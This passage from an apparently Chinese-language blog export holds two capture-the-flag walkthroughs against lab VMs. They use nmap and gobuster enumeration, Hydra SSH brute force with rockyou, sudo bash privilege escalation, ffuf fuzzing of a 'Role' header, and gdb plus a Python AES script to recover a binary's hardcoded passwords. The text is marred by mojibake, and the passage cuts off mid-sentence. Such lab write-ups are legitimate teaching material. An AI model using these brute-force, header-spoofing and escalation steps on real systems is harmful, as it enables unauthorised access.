ssh-hostkey: | 3072 8c:c5:70:a6:8f:7c:53:6f:98:6d:01:9c:63:b7:3b:60 (RSA)\r| 256 31:1f:74:73:32:ff:8e:f0:f9:63:fb:51:13:98:32:27 (ECDSA)\r|_ 256 7e:1f:ea:1b:50:38:d8:88:5a:fc:cb:6f:70:3f:25:0b (ED25519)\r80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.41 (Ubuntu) Gobuster #\r[root@kali] /home/kali/homelab â¯ gobuster dir -u http://192.168.56.156/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 50 ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.156/\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/note.txt (Status: 200) [Size: 162]\r/server-status (Status: 403) [Size: 279]\rProgress: 661680 / 661683 (100.00%)\r=============================================================== æŸ¥çœ‹**/note.txt**\n#http://192.168.56.156/note.txt\rHi Alex,\rI wanted to inform you that IÃ¢â‚¬â„¢ve changed your password. Please let me know if you need the new details or if you encounter any issues.\rBest regards! Hydra #\rå°è¯•çˆ†ç ´ssh\n[root@kali] /home/kali/homelab â¯ hydra -l alex -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.156 -I â\rHydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-19 11:10:33\r[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task\r[DATA] attacking ssh://192.168.56.156:22/\r[22][ssh] host: 192.168.56.156 login: alex password: princess1\r1 of 1 target successfully completed, 1 valid password found å¾—åˆ°å¯†ç æ˜¯ï¼šprincess1\nRoot #\ralex@easyaspie:~$ sudo -l\rMatching Defaults entries for alex on easyaspie:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser alex may run the following commands on easyaspie:\r(ALL) NOPASSWD: /bin/bash ç›´æ¥å¼€å¯bashå°±è¡Œäº†\nalex@easyaspie:~$ sudo /bin/bash\rroot@easyaspie:/home/alex# whoami\rroot\rroot@easyaspie:/home/alex# Summary #\ræ¯«æ— è¥å…»çš„ä¸€ä¸ªé¶æœºï¼Œå±…ç„¶è¿˜æœ‰4ä¸ªGçš„å¤§å°ï¼Œç»“æœå°±æ•´è¿™ç§ç©æ„ï¼Œæµªè´¹æ—¶é—´ã€‚\n","date":"2025-04-19","externalUrl":null,"permalink":"/posts/2025/04/vulnvm-easyaspie/","section":"Posts","summary":"","title":"VulnVM-easyaspie","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium ææƒéƒ¨åˆ†ä¸ºéé¢„æœŸ\nNmap #\r[root@kali] /home/kali/stackinferno â¯ nmap 172.17.0.2 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 88:00:5f:26:eb:50:e4:55:6d:0a:0c:73:58:99:cd:2d (ECDSA)\r|_ 256 6b:36:5c:a3:c0:8b:22:b7:35:11:86:f1:7e:7f:77:5b (ED25519)\r80/tcp open http Werkzeug/2.2.2 Python/3.11.2\r|_http-server-header: Werkzeug/2.2.2 Python/3.11.2\r| fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 302 FOUND\r| Server: Werkzeug/2.2.2 Python/3.11.2\r| Date: Wed, 16 Apr 2025 03:01:23 GMT\r| Content-Type: text/html; charset=utf-8\r| Content-Length: 223\r| Location: http://cybersec.dl\r| Connection: close\r| \u0026lt;!doctype html\u0026gt;\r| \u0026lt;html lang=en\u0026gt;\r| \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt;\r| \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt;\r| \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;http://cybersec.dl\u0026#34;\u0026gt;http://cybersec.dl\u0026lt;/a\u0026gt;. If not, click the link.\r| GetRequest, HTTPOptions: | HTTP/1.1 302 FOUND\r| Server: Werkzeug/2.2.2 Python/3.11.2\r| Date: Wed, 16 Apr 2025 03:01:18 GMT\r| Content-Type: text/html; charset=utf-8\r| Content-Length: 223\r| Location: http://cybersec.dl\r| Connection: close\r| \u0026lt;!doctype html\u0026gt;\r| \u0026lt;html lang=en\u0026gt;\r| \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt;\r| \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt;\r| \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;http://cybersec.dl\u0026#34;\u0026gt;http://cybersec.dl\u0026lt;/a\u0026gt;. If not, click the link.\r| RTSPRequest: | \u0026lt;!DOCTYPE HTML\u0026gt;\r| \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r| \u0026lt;head\u0026gt;\r| \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt;\r| \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt;\r| \u0026lt;/head\u0026gt;\r| \u0026lt;body\u0026gt;\r| \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt;\r| \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt;\r| \u0026lt;p\u0026gt;Message: Bad request version (\u0026#39;RTSP/1.0\u0026#39;).\u0026lt;/p\u0026gt;\r| \u0026lt;p\u0026gt;Error code explanation: 400 - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt;\r| \u0026lt;/body\u0026gt;\r|_ \u0026lt;/html\u0026gt;\r|_http-title: CyberSec Corp - Expertos en Ciberseguridad æ·»åŠ åŸŸåï¼šcybersec.dl\nAPI Fuzz #\ræŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰jsæ‹¦æˆªï¼Œå¯ä»¥å¦å¤–æå‰å¼€ä¸€ä¸ªF12ï¼Œç„¶åæ‰‹åŠ¨è¾“å…¥urlè·³è½¬\nå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ª**/api**è·¯å¾„ï¼Œé‡Œé¢ç»™å‡ºçš„å¯†ç éƒ½æ˜¯æ²¡ç”¨çš„\næ‰«æä¸€ä¸‹å…¶ä»–çš„æ¥å£\n[root@kali] /home/kali/stackinferno â¯ gobuster dir -u http://cybersec.dl/api -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://cybersec.dl/api\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/interest (Status: 405) [Size: 153] æ³¨æ„å¿…é¡»ä½¿ç”¨POSTå‘åŒ…ï¼Œå‘ç°åˆ°éœ€è¦è®¾ç½®ä¸€ä¸ªè¯·æ±‚å¤´\n[root@kali] /home/kali/stackinferno â¯ curl http://cybersec.dl/api/interest \u0026lt;!doctype html\u0026gt;\r\u0026lt;html lang=en\u0026gt;\r\u0026lt;title\u0026gt;405 Method Not Allowed\u0026lt;/title\u0026gt;\r\u0026lt;h1\u0026gt;Method Not Allowed\u0026lt;/h1\u0026gt;\r\u0026lt;p\u0026gt;The method is not allowed for the requested URL.\u0026lt;/p\u0026gt;\r[root@kali] /home/kali/stackinferno â¯ curl -X POST http://cybersec.dl/api/interest {\r\u0026#34;message\u0026#34;: \u0026#34;Error: \u0026#39;Role\u0026#39; header not provided\u0026#34;\r} å¯¹è¿™ä¸ªRoleè¿›è¡Œç”¨æˆ·æšä¸¾\n[root@kali] /home/kali/stackinferno â¯ ffuf -X POST -u \u0026#39;http://cybersec.dl/api/interest\u0026#39; -H \u0026#39;Role: FUZZ\u0026#39; -w ../Desktop/fuzzDicts/userNameDict/user.txt -fc 403 â\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : POST\r:: URL : http://cybersec.dl/api/interest\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/userNameDict/user.txt\r:: Header : Role: FUZZ\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response status: 403\r________________________________________________\ruser [Status: 200, Size: 237, Words: 39, Lines: 10, Duration: 38ms]\rAdministrator [Status: 200, Size: 781, Words: 83, Lines: 14, Duration: 39ms]\r:: Progress: [8886/8886] :: Job [1/1] :: 1169 req/sec :: Duration: [0:00:08] :: Errors: 0 :: è®¾ç½®ä¸ºç®¡ç†å‘˜æŸ¥çœ‹å›æ˜¾ï¼Œæ‰€æœ‰åŸŸåä¸­ï¼Œæœ‰ç”¨çš„å°±åªæœ‰ï¼š0internal_down.cybersec.dl\n[root@kali] /home/kali/stackinferno â¯ curl -X POST http://cybersec.dl/api/interest -H \u0026#34;Role: Administrator\u0026#34; {\r\u0026#34;company\u0026#34;: {\r\u0026#34;URLs_web\u0026#34;: \u0026#34;cybersec.dl, soc_internal_operations.cybersec.dl, bin.cybersec.dl, mail.cybersec.dl, dev.cybersec.dl, cybersec.htb/downloads, internal-api.cybersec.dl, 0internal_down.cybersec.dl, internal.cybersec.dl, cybersec.htb/documents, cybersec.htb/api/cpu, cybersec.htb/api/login\u0026#34;,\r\u0026#34;UUID\u0026#34;: \u0026#34;f47ac10b-58cc-4372-a567-0e02b2c3d479, df7ac10b-58mc-43fx-a567-0e02b2r3d479\u0026#34;,\r\u0026#34;address\u0026#34;: \u0026#34;New York, EEUU\u0026#34;,\r\u0026#34;branches\u0026#34;: \u0026#34;Brazil, Curacao, Lithuania, Luxembourg, Japan, Finland\u0026#34;,\r\u0026#34;customers\u0026#34;: \u0026#34;ADIDAS, COCACOLA, PEPSICO, Teltonika, Toray Industries, Weg, CURALINk\u0026#34;,\r\u0026#34;name\u0026#34;: \u0026#34;CyberSec Corp\u0026#34;,\r\u0026#34;phone\u0026#34;: \u0026#34;+1322302450134200\u0026#34;,\r\u0026#34;services\u0026#34;: \u0026#34;Auditorias de seguridad, Pentesting, Consultoria en ciberseguridad\u0026#34;\r},\r\u0026#34;message\u0026#34;: \u0026#34;Acceso permitido\u0026#34;\r} è®¿é—®éœ€è¦è®¾ç½®UUIDå¤´ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨ä¸Šè·å–åˆ°çš„\n[root@kali] /home/kali/stackinferno â¯ curl http://0internal_down.cybersec.dl \u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;es\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\r\u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;403 - Acceso denegado\u0026lt;/title\u0026gt;\r\u0026lt;style\u0026gt;\rbody {\rfont-family: Arial, sans-serif;\rbackground-color: #f4f4f4;\rcolor: #333;\rtext-align: center;\rpadding: 50px;\r}\rh1 {\rcolor: #d9534f;\r}\rp {\rfont-size: 1.2em;\r}\r\u0026lt;/style\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;h1\u0026gt;403 - Acceso denegado\u0026lt;/h1\u0026gt;\r\u0026lt;p\u0026gt;El encabezado \u0026lt;code\u0026gt;X-UUID-Access\u0026lt;/code\u0026gt; no estÃ¡ presente.\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;# è®¾ç½®å¥½åå¯ä»¥è¿›å…¥åˆ°é¡µé¢ï¼Œæ˜¯ä¸€ä¸ªä¸‹è½½é¡µé¢\n[root@kali] /home/kali/stackinferno â¯ curl http://0internal_down.cybersec.dl -H \u0026#39;X-UUID-Access: f47ac10b-58cc-4372-a567-0e02b2c3d479\u0026#39;\r....\r....\r\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;Sec2Pass\u0026lt;/h1\u0026gt;\r\u0026lt;div class=\u0026#34;file-list\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;file-item\u0026#34;\u0026gt;\r\u0026lt;span class=\u0026#34;file-name\u0026#34;\u0026gt;sec2pass\u0026lt;/span\u0026gt;\r\u0026lt;button class=\u0026#34;download-btn\u0026#34; onclick=\u0026#34;downloadFile(\u0026#39;sec2pass\u0026#39;)\u0026#34;\u0026gt;Descargar\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;file-item\u0026#34;\u0026gt;\r\u0026lt;span class=\u0026#34;file-name\u0026#34;\u0026gt;sec2pass_note.txt\u0026lt;/span\u0026gt;\r\u0026lt;button class=\u0026#34;download-btn\u0026#34; onclick=\u0026#34;downloadFile(\u0026#39;sec2pass_note.txt\u0026#39;)\u0026#34;\u0026gt;Descargar\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rfunction downloadFile(fileName) {\rconst link = document.createElement(\u0026#39;a\u0026#39;);\rlink.href = `http://0internal_down.cybersec.dl/download/${fileName}`;\rlink.download = fileName; document.body.appendChild(link);\rlink.click();\rdocument.body.removeChild(link);\r}\r\u0026lt;/script\u0026gt;\r\u0026lt;/script\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;# Decompile #\rç”±äºå…¨å±€æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„é™æ€å­—ç¬¦ä¸²ï¼Œå› æ­¤è¿˜å¾—ä»ä»£ç é€»è¾‘å…¥æ‰‹\nå…ˆæ¥çœ‹çœ‹mainå‡½æ•°ä»£ç \nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rchar v4[112]; // [rsp+0h] [rbp-10F0h] BYREF\rchar v5[112]; // [rsp+70h] [rbp-1080h] BYREF\rchar dest[1024]; // [rsp+E0h] [rbp-1010h] BYREF\rchar s[1024]; // [rsp+4E0h] [rbp-C10h] BYREF\rchar format[1024]; // [rsp+8E0h] [rbp-810h] BYREF\rchar v9[1032]; // [rsp+CE0h] [rbp-410h] BYREF\runsigned __int64 v10; // [rsp+10E8h] [rbp-8h]\rv10 = __readfsqword(0x28u);\rmemset(dest, 0, sizeof(dest));\rstrcat(dest, AMLP);\rstrcat(dest, PRZS);\rstrcat(dest, ING);\r*(_WORD *)\u0026amp;dest[strlen(dest)] = 32;\rstrcat(dest, PROS);\r*(_WORD *)\u0026amp;dest[strlen(dest)] = 32;\rstrcat(dest, TANO);\rstrcat(dest, CHZ);\rstrcat(dest, PWD);\rstrcat(dest, CLIK);\rstrcat(dest, PARR);\rmemset(s, 0, sizeof(s));\rstrcat(s, TANO);\rstrcat(s, CHZ);\rstrcat(s, PWD);\rstrcat(s, CLIK);\rstrcat(s, ASMLF);\r*(_WORD *)\u0026amp;s[strlen(s)] = 32;\rstrcat(s, VNZ);\rstrcat(s, HK);\rstrcat(s, EEUU);\rstrcat(s, DNMC);\rstrcat(s, ERTG);\rmemset(format, 0, sizeof(format));\rstrcat(format, AMLP);\rstrcat(format, PRZS);\rstrcat(format, ING);\r*(_WORD *)\u0026amp;format[strlen(format)] = 32;\rstrcat(format, ASMQ);\r*(_WORD *)\u0026amp;format[strlen(format)] = 32;\rstrcat(format, NRG);\rstrcat(format, BRZL);\r*(_WORD *)\u0026amp;format[strlen(format)] = 32;\rstrcat(format, LAKDF);\r*(_WORD *)\u0026amp;format[strlen(format)] = 32;\rstrcat(format, WVWVEB);\rstrcat(format, RBWRTB);\rstrcat(format, AEBDV);\rstrcat(format, QQQQ);\rmemset(v9, 0, 0x400uLL);\rstrcat(v9, NRG);\rstrcat(v9, BRZL);\r*(_WORD *)\u0026amp;v9[strlen(v9)] = 32;\rstrcat(v9, LAKDF);\r*(_WORD *)\u0026amp;v9[strlen(v9)] = 32;\rstrcat(v9, WVWVEB);\rstrcat(v9, RBWRTB);\rstrcat(v9, AEBDV);\r*(_WORD *)\u0026amp;v9[strlen(v9)] = 32;\rstrcat(v9, VNZ);\rstrcat(v9, HK);\rstrcat(v9, EEUU);\rstrcat(v9, ASMQXZ);\rstrcat(v9, POIKJ);\rstrcat(v9, ERTG);\rfn2();\rprintf(dest);\r__isoc99_scanf(\u0026#34;%s\u0026#34;, v4);\rif ( b6v4c8(v4) )\r{\rprintf(format);\r__isoc99_scanf(\u0026#34;%s\u0026#34;, v5);\rif ( (unsigned int)x1w5z9(v5) )\r{\rk8j4h3();\rreturn 0;\r}\relse\r{\rprintf(v9);\rreturn 1;\r}\r}\relse\r{\rprintf(s);\rreturn 1;\r}\r} å…³æ³¨ä¸€ä¸‹b6v4c8å‡½æ•°é‡Œçš„é€»è¾‘ğŸ‘‡\n_BOOL8 __fastcall b6v4c8(const char *a1)\r{\r__int64 v2; // [rsp+18h] [rbp-78h] BYREF\rchar s2[104]; // [rsp+20h] [rbp-70h] BYREF\runsigned __int64 v4; // [rsp+88h] [rbp-8h]\rv4 = __readfsqword(0x28u);\rif ( !(unsigned int)qw3e7t((__int64)\u0026amp;p0o9i8, 0x30u, (__int64)s2, \u0026amp;v2) )\rreturn 0LL;\rs2[v2] = 0;\rreturn strcmp(a1, s2) == 0;\r} qw3e7tå‡½æ•°é€»è¾‘ğŸ‘‡ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªAES_ECBçš„å¯†ç ç±»å‹\n__int64 __fastcall qw3e7t(__int64 a1, unsigned int a2, __int64 a3, _QWORD *a4)\r{\r__int64 v5; // rax\rint v8; // [rsp+2Ch] [rbp-14h] BYREF\r__int64 v9; // [rsp+30h] [rbp-10h]\runsigned __int64 v10; // [rsp+38h] [rbp-8h]\rv10 = __readfsqword(0x28u);\rv9 = EVP_CIPHER_CTX_new();\rif ( v9 )\r{\rv5 = EVP_aes_256_ecb();\rif ( (unsigned int)EVP_DecryptInit_ex(v9, v5, 0LL, \u0026amp;zxq9v8, 0LL) == 1 )\r{\rif ( (unsigned int)EVP_DecryptUpdate(v9, a3, \u0026amp;v8, a1, a2) == 1 )\r{\r*a4 = v8;\rif ( (unsigned int)EVP_DecryptFinal_ex(v9, v8 + a3, \u0026amp;v8) == 1 )\r{\r*a4 += v8;\rEVP_CIPHER_CTX_free(v9);\rreturn 1LL;\r}\relse\r{\rfwrite(\u0026#34;Error al finalizar el descifrado.\\n\u0026#34;, 1uLL, 0x22uLL, _bss_start);\rEVP_CIPHER_CTX_free(v9);\rreturn 0LL;\r}\r}\relse\r{\rfwrite(\u0026#34;Error al descifrar los datos.\\n\u0026#34;, 1uLL, 0x1EuLL, _bss_start);\rEVP_CIPHER_CTX_free(v9);\rreturn 0LL;\r}\r}\relse\r{\rfwrite(\u0026#34;Error al inicializar el descifrado.\\n\u0026#34;, 1uLL, 0x24uLL, _bss_start);\rEVP_CIPHER_CTX_free(v9);\rreturn 0LL;\r}\r}\relse\r{\rfwrite(\u0026#34;Error al crear el contexto de cifrado.\\n\u0026#34;, 1uLL, 0x27uLL, _bss_start);\rreturn 0LL;\r}\r} é‚£ä¹ˆè¦ç»•è¿‡ç¬¬ä¸€å±‚çš„è¯ï¼Œé¦–å…ˆæˆ‘ä»¬è¾“å…¥çš„æ˜æ–‡è¦ä¸å¯†æ–‡è§£å¯†ä¸€è‡´\nè·å–ä¸€ä¸‹å¯†é’¥zxq9v8çš„å†…å®¹ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯gdbä¸‹æ–­ç‚¹ç„¶åæ‰¾å˜é‡\n[root@kali] /home/kali/Downloads â¯ gdb sec2pass â\rGNU gdb (Debian 15.2-1) 15.2\rCopyright (C) 2024 Free Software Foundation, Inc.\rLicense GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt;\rThis is free software: you are free to change and redistribute it.\rThere is NO WARRANTY, to the extent permitted by law.\rType \u0026#34;show copying\u0026#34; and \u0026#34;show warranty\u0026#34; for details.\rThis GDB was configured as \u0026#34;x86_64-linux-gnu\u0026#34;.\rType \u0026#34;show configuration\u0026#34; for configuration details.\rFor bug reporting instructions, please see:\r\u0026lt;https://www.gnu.org/software/gdb/bugs/\u0026gt;.\rFind the GDB manual and other documentation resources online at:\r\u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;.\rFor help, type \u0026#34;help\u0026#34;.\rType \u0026#34;apropos word\u0026#34; to search for commands related to \u0026#34;word\u0026#34;...\rReading symbols from sec2pass...\r(No debugging symbols found in sec2pass)\r(gdb) break qw3e7t\rBreakpoint 1 at 0x2687\r(gdb) run\rStarting program: /home/kali/Downloads/sec2pass [Thread debugging using libthread_db enabled]\rUsing host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;.\ringrese la contraseÃ±a: 123\rBreakpoint 1, 0x0000555555556687 in qw3e7t ()\r(gdb) x/s \u0026amp;zxq9v8\r0x55555555a300 \u0026lt;zxq9v8\u0026gt;: \u0026#34;w8fcencwcbuw9ef849f89999920484hf\u0026#34;\r(gdb) å¾—åˆ°å¯†é’¥çš„å†…å®¹æ˜¯ï¼šw8fcencwcbuw9ef849f89999920484hf\nå†æ¥æŸ¥çœ‹ä¸€ä¸‹å¯†æ–‡çš„å†…å®¹ï¼Œéœ€è¦è½¬æˆåå…­è¿›åˆ¶ï¼Œä¼ å‚ä¸­æŒ‡å®šçš„æ˜¯0x30uï¼Œå› æ­¤æ˜¯48ä½çš„\n(gdb) x/48xb \u0026amp;p0o9i8\r0x5555555580a0 \u0026lt;p0o9i8\u0026gt;: 0x30 0xbc 0x92 0x70 0xb1 0x5a 0xbe 0xb1\r0x5555555580a8 \u0026lt;p0o9i8+8\u0026gt;: 0x0f 0x8b 0x11 0xae 0x07 0x68 0x3d 0x11\r0x5555555580b0 \u0026lt;p0o9i8+16\u0026gt;: 0x47 0x06 0x6a 0x52 0x8f 0xfc 0x84 0x1c\r0x5555555580b8 \u0026lt;p0o9i8+24\u0026gt;: 0x82 0x78 0x26 0xc9 0x9f 0x26 0x4e 0x97\r0x5555555580c0 \u0026lt;p0o9i8+32\u0026gt;: 0xac 0xeb 0xef 0xe3 0x96 0x0d 0x23 0x31\r0x5555555580c8 \u0026lt;p0o9i8+40\u0026gt;: 0xbf 0xe0 0x45 0x70 0x44 0xda 0xcf 0xcd\r(gdb) ç”±äºåŠ å¯†ç®—æ³•ä½¿ç”¨çš„æ˜¯AES_ECBï¼Œå› æ­¤æœ‰å¯†æ–‡å’Œå¯†é’¥å°±å¤Ÿäº†ï¼ˆè¯¦ç»†å†…å®¹è¯·è‡ªè¡Œæœç´¢äº†è§£ï¼‰\nè§£å¯†ä»£ç ğŸ‘‡\nkey = b\u0026#34;w8fcencwcbuw9ef849f89999920484hf\u0026#34; # æ¥è‡ª \u0026amp;zxq9v8\rciphertext = bytes.fromhex(\r\u0026#34;30bc9270b15abeb10f8b11ae07683d1147066a528ffc841c827826c99f264e97\u0026#34;\r\u0026#34;acebefe3960d2331bfe0457044dacfcd\u0026#34;\r)\rfrom Crypto.Cipher import AES\rfrom Crypto.Util.Padding import unpad\rcipher = AES.new(key, AES.MODE_ECB)\rplaintext = cipher.decrypt(ciphertext)\r# å°è¯•å»é™¤ PKCS#7 å¡«å……\rtry:\rplaintext = unpad(plaintext, AES.block_size)\rexcept ValueError:\rpass\rprint(\u0026#34;è§£å¯†åçš„å¯†ç :\u0026#34;, plaintext.decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;ignore\u0026#34;))\r#è§£å¯†åçš„å¯†ç : 789dciubdicv478v7hs8478w72gbfv09893475 å¯ä»¥çœ‹åˆ°æˆåŠŸè¿›å…¥äº†ç¬¬äºŒå±‚\nç¬¬äºŒå±‚çš„ä»£ç ğŸ‘‡ï¼Œè¿˜æ˜¯ä¸€æ ·çš„åŠ å¯†é€»è¾‘ï¼Œåªä¸è¿‡è¿™é‡Œçš„å¯†æ–‡é•¿åº¦åªæœ‰0x10uï¼Œä¹Ÿå°±æ˜¯16ä¸ªå­—èŠ‚\n_BOOL8 __fastcall x1w5z9(const char *a1)\r{\r__int64 v2; // [rsp+18h] [rbp-78h] BYREF\rchar s2[104]; // [rsp+20h] [rbp-70h] BYREF\runsigned __int64 v4; // [rsp+88h] [rbp-8h]\rv4 = __readfsqword(0x28u);\rif ( !(unsigned int)qw3e7t((__int64)\u0026amp;l3k7j5, 0x10u, (__int64)s2, \u0026amp;v2) )\rreturn 0LL;\rs2[v2] = 0;\rreturn strcmp(a1, s2) == 0;\r} ç”±äºä½¿ç”¨çš„éƒ½æ˜¯qw3e7tåŒä¸€ä¸ªå‡½æ•°ï¼Œå› æ­¤å¯†é’¥ä¹Ÿæ˜¯ä¸€æ ·çš„\nè¿™é‡Œè·å–å¯†æ–‡l3k7j5\n(gdb) break qw3e7t Breakpoint 1 at 0x2687\r(gdb) run\rStarting program: /home/kali/Downloads/sec2pass [Thread debugging using libthread_db enabled]\rUsing host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;.\ringrese la contraseÃ±a: 789dciubdicv478v7hs8478w72gbfv09893475\rBreakpoint 1, 0x0000555555556687 in qw3e7t ()\r(gdb) x/16xb \u0026amp;l3k7j5\r0x5555555580d0 \u0026lt;l3k7j5\u0026gt;: 0x3a 0x37 0x1c 0x25 0x3d 0x6b 0x79 0xaf\r0x5555555580d8 \u0026lt;l3k7j5+8\u0026gt;: 0xf2 0x95 0x46 0xd8 0xab 0x48 0x70 0x37 å†æ¬¡è§£å¯†ä¸€ä¸‹ğŸ‘‡\n# ä» gdb è¾“å‡ºçš„åå…­è¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚ï¼ˆç›´æ¥æŒ‰é¡ºåºæ‹¼æ¥ï¼‰\rciphertext = bytes.fromhex(\u0026#34;3a371c253d6b79aff29546d8ab487037\u0026#34;)\rfrom Crypto.Cipher import AES\rfrom Crypto.Util.Padding import unpad\r# å¯†é’¥ï¼ˆä¸ä¹‹å‰ç›¸åŒï¼‰\rkey = b\u0026#34;w8fcencwcbuw9ef849f89999920484hf\u0026#34; # 32å­—èŠ‚ AES-256 å¯†é’¥\r# è§£å¯†\rcipher = AES.new(key, AES.MODE_ECB)\rplaintext = cipher.decrypt(ciphertext)\r# å°è¯•å»é™¤ PKCS#7 å¡«å……ï¼ˆå¦‚æœå­˜åœ¨ï¼‰\rtry:\rplaintext = unpad(plaintext, AES.block_size)\rexcept ValueError:\rpass # æ— å¡«å……æˆ–é•¿åº¦æ­£ç¡®\r# è¾“å‡ºç»“æœ\rprint(\u0026#34;è§£å¯†åçš„å¯†ç ï¼ˆåŸå§‹å­—èŠ‚ï¼‰:\u0026#34;, plaintext)\rprint(\u0026#34;å°è¯•è§£ç :\u0026#34;, plaintext.decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;replace\u0026#34;))\r#è§£å¯†åçš„å¯†ç ï¼ˆåŸå§‹å­—èŠ‚ï¼‰: b\u0026#39;00485825\u0026#39;\r#å°è¯•è§£ç : 00485825 å¾—åˆ°æ˜æ–‡ï¼š00485825\nä¸¤ä¸ªæ˜æ–‡éƒ½æœ‰äº†ï¼Œæ‰§è¡Œæ–‡ä»¶ï¼Œå¾—åˆ°å‡­è¯\nåœ¨carlosçš„ç›®å½•ä¸‹æ‹¿åˆ°user.txt\nOwn robert #\ræŸ¥çœ‹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªmboxçš„é‚®ä»¶ä¿¡æ¯\nè¿™é‡Œæˆ‘ç®€ç•¥ç¿»è¯‘ä¸€ä¸‹\n# robert to carlos\rä½ å¥½ï¼Œå¡æ´›æ–¯ï¼Œå¸Œæœ›ä½ ä¸€åˆ‡éƒ½å¥½ã€‚æˆ‘è·Ÿä½ è¯´ä¸€ä¸‹ï¼Œæˆ‘å¾—å’Œåè°ƒå‘˜ä¸€èµ·å»å¦ä¸€ä¸ªåŸå¸‚å‚åŠ ä¸€ä¸ªæ´»åŠ¨ã€‚é—®é¢˜æ˜¯æˆ‘æ²¡æ—¶é—´ç­‰ä½ 